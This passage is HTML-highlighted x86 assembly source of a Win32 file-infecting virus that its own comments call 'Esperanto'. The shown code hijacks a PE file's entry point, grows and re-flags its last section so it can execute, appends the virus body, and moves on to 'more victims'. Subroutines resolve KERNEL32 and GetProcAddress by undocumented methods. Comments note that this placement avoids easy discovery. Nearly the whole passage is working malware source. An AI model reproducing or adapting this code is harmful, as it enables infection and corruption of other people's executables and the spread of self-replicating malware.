</span><span class="sc5">infect32_pe</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inf_counter</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unmap_close</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],\
</span><span class="sc0">                                                </span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_map_file</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_good</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc1">; Get the RVA of the last section header in</span><span class="sc0">
                </span><span class="sc1">; EDI. Here's where we're going to copy our</span><span class="sc0">
                </span><span class="sc1">; code, so no new sections are needed and</span><span class="sc0">
                </span><span class="sc1">; we're not so easily discovered in a file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Now get the old entry point and store its</span><span class="sc0">
                </span><span class="sc1">; RVA in a dynamic variable of our code we</span><span class="sc0">
                </span><span class="sc1">; will use in order to jump back to our host</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_rva</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; Get original file size and store it for</span><span class="sc0">
                </span><span class="sc1">; later use during the PE infection process</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Calculate new entry point by means of the</span><span class="sc0">
                </span><span class="sc1">; original file size and our memory size, and</span><span class="sc0">
                </span><span class="sc1">; save it as the new AddressOfEntryPoint</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">espow32_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; And store the RVA of the base address, not</span><span class="sc0">
                </span><span class="sc1">; forgetting to add the dseta offset to it</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dseta_offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">base_address</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Get new size of VirtualSize</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">espo_mem_size</span><span class="sc4">-</span><span class="sc5">espo_file_size</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">virtsize_ok</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">virtsize_ok</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; And now the new size of SizeOfRawData</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">espo_mem_size</span><span class="sc4">-</span><span class="sc5">espo_file_size</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Set section characteristics to execute, read</span><span class="sc0">
                </span><span class="sc1">; and write access, so Esperanto will not find</span><span class="sc0">
                </span><span class="sc1">; any problem when performing its functioning</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],\
</span><span class="sc0">                                   </span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc5">or\
</span><span class="sc0">                                   </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">    </span><span class="sc5">or\
</span><span class="sc0">                                   </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">

                </span><span class="sc1">; Update the SizeOfImage pointer</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; And finally append the virus body to the</span><span class="sc0">
                </span><span class="sc1">; the end of the PE file we've just infected,</span><span class="sc0">
                </span><span class="sc1">; unmap it and go look for more victims</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">espo_start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">no_good</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ Subroutines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Note: the following subroutines are used by the Win32 module in order to</span><span class="sc0">
</span><span class="sc1">;   perform many repeated actions, such as mapping or unmapping a file, fin-</span><span class="sc0">
</span><span class="sc1">;   ding RVAs or the base address of a given module or API, and so on.</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Undocumented way to find the address of K32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş EBX =&gt; base address of host</span><span class="sc0">
</span><span class="sc1">;     ş Necessity to find KERNEL32.DLL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;     ş EAX =&gt; base address of KERNEL32.DLL</span><span class="sc0">
</span><span class="sc1">;     ş EBX =&gt; base address of host</span><span class="sc0">

                </span><span class="sc1">; Try to get the base address of KERNEL32</span><span class="sc0">
                </span><span class="sc1">; by means of ID_ForwarderChain. This is</span><span class="sc0">
                </span><span class="sc1">; an undocumented feature which only works</span><span class="sc0">
                </span><span class="sc1">; in Windows95. First load the RVA in ESI</span><span class="sc0">
                </span><span class="sc1">; and then add the base address to it</span><span class="sc0">

</span><span class="sc5">get_kernel32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0beh</span><span class="sc0">
</span><span class="sc5">kernel32_rva</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc1">; Now check for the MZ signature</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">k32_not_found</span><span class="sc0">

                </span><span class="sc1">; And finally, for the PE one. If it was</span><span class="sc0">
                </span><span class="sc1">; found, then the undocumented feature has</span><span class="sc0">
                </span><span class="sc1">; worked. Otherwise the control will be</span><span class="sc0">
                </span><span class="sc1">; passed to our host, as we can't execute</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">kernel_found</span><span class="sc0">
</span><span class="sc5">k32_not_found</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Undocumented way to find the address of GetProcAddress ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş EBX        =&gt; base address of host</span><span class="sc0">
</span><span class="sc1">;     ş kernel32_a =&gt; base address of KERNEL32.DLL</span><span class="sc0">
</span><span class="sc1">;     ş Necessity to find GetProcAddress</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;     ş EAX        =&gt; address of GetProcAddress</span><span class="sc0">
</span><span class="sc1">;     ş EBX        =&gt; base address of host</span><span class="sc0">

                </span><span class="sc1">; This undocumented way to get the address</span><span class="sc0">
                </span><span class="sc1">; of the API GetProcAddress is based on</span><span class="sc0">
                </span><span class="sc1">; looking for its name and later for its</span><span class="sc0">
                </span><span class="sc1">; ordinal thru the array of APIs exported</span><span class="sc0">
                </span><span class="sc1">; by the module KERNEL32.DLL. Thus, the</span><span class="sc0">
                </span><span class="sc1">; first step consists on seeking to the</span><span class="sc0">
                </span><span class="sc1">; base address of this library and making</span><span class="sc0">
                </span><span class="sc1">; sure this is the right address</span><span class="sc0">

</span><span class="sc5">get_gpaddress</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">gpa_aborted</span><span class="sc0">

                </span><span class="sc1">; Once we know it has a MZ header, let's</span><span class="sc0">
                </span><span class="sc1">; check for the PE mark, pointed by [3ch]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">gpa_aborted</span><span class="sc0">

                </span><span class="sc1">; Everything ok, now let's get a pointer</span><span class="sc0">
                </span><span class="sc1">; to the image export directory and push</span><span class="sc0">
                </span><span class="sc1">; it onto the stack for later use</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">NT_OptionalHeader\
</span><span class="sc0">                           </span><span class="sc5">.OH_DirectoryEntries\
</span><span class="sc0">                           </span><span class="sc5">.DE_Export\
</span><span class="sc0">                           </span><span class="sc5">.DD_VirtualAddress</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Get also a pointer to the table of the</span><span class="sc0">
                </span><span class="sc1">; names of exported functions and to their</span><span class="sc0">
                </span><span class="sc1">; corresponding ordinals or addresses</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ED_AddressOfNameOrdinals</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">; Now look for "GetProcAddress" thru the</span><span class="sc0">
                </span><span class="sc1">; array of names of exported API functions</span><span class="sc0">

</span><span class="sc5">search_name</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gpaddress_n</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">next_name</span><span class="sc0">

                </span><span class="sc1">; Compare the strings</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">name_found</span><span class="sc0">

                </span><span class="sc1">; Not found, go to next name</span><span class="sc0">

</span><span class="sc5">next_name</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">search_name</span><span class="sc0">

                </span><span class="sc1">; In case it was not found, jump to the</span><span class="sc0">
                </span><span class="sc1">; error routine and stop the functioning</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gpa_aborted</span><span class="sc0">

                </span><span class="sc1">; The "GetProcAddress" string was found,</span><span class="sc0">
                </span><span class="sc1">; and EDX is the index of the function,</span><span class="sc0">
                </span><span class="sc1">; so now we have to look for the ordinal</span><span class="sc0">
                </span><span class="sc1">; using the mentioned index in EDX, and</span><span class="sc0">
                </span><span class="sc1">; check if it is out of range</span><span class="sc0">

</span><span class="sc5">name_found</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">gpa_aborted</span><span class="sc0">

                </span><span class="sc1">; This is the starting ordinal number</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ED_BaseOrdinal</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc1">; Finally, get address of function and jump</span><span class="sc0">
                </span><span class="sc1">; back to the main routine, in order to look</span><span class="sc0">
                </span><span class="sc1">; for the addresses of other needed APIs</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gpadd_found</span><span class="sc0">

                </span><span class="sc1">; In case there was an error, stop running</span><span class="sc0">
                </span><span class="sc1">; and jump to the original entry point</span><span class="sc0">

</span><span class="sc5">gpa_aborted</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

